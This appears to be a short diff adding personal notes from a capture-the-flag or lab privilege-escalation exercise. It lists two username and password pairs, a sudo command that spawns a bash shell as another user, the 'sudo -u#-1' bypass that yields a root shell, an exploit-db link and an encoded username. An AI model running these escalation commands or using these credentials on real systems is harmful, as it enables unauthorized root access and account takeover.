@@ -1,0 +1,10 @@
+fergus:RolandDeschain
+sudo -u shaun /bin/bash -c "/bin/bash"
+hugo:Password120
+
+
+sudo -u#-1 /bin/bash
+
+https://www.exploit-db.com/exploits/47502
+
+5a6d56795a33567a >> ZmVyZ3Vz
